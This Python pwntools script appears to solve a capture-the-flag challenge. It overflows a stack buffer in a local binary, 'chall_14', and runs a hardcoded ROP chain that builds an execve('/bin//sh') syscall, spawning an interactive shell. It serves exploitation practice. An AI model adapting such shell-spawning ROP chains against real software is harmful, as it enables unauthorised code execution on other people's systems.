# RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
# Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1872 Symbols      No    0               0               chall_14
import pwn
from struct import pack

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_14")

offset = 0x108 # var char *s @ stack - 0x108
# Padding goes here
ropchain = b'A'*offset
# Thanks ROPgadget
ropchain += pack('<Q', 0x000000000040f3fe) # pop rsi ; ret
ropchain += pack('<Q', 0x00000000004c00e0) # @ .data
ropchain += pack('<Q', 0x00000000004494a7) # pop rax ; ret
ropchain += b'/bin//sh'
ropchain += pack('<Q', 0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
ropchain += pack('<Q', 0x000000000040f3fe) # pop rsi ; ret
ropchain += pack('<Q', 0x00000000004c00e8) # @ .data + 8
ropchain += pack('<Q', 0x0000000000443b00) # xor rax, rax ; ret
ropchain += pack('<Q', 0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
ropchain += pack('<Q', 0x00000000004018ca) # pop rdi ; ret
ropchain += pack('<Q', 0x00000000004c00e0) # @ .data
ropchain += pack('<Q', 0x000000000040f3fe) # pop rsi ; ret
ropchain += pack('<Q', 0x00000000004c00e8) # @ .data + 8
ropchain += pack('<Q', 0x00000000004017cf) # pop rdx ; ret
ropchain += pack('<Q', 0x00000000004c00e8) # @ .data + 8
ropchain += pack('<Q', 0x0000000000443b00) # xor rax, rax ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004709f0) # add rax, 1 ; ret
ropchain += pack('<Q', 0x00000000004012d3) # syscall

p = pwn.process(elf.path)

p.recvuntil(b"Obligatory thing to print\n")

p.sendline(ropchain)

p.interactive()

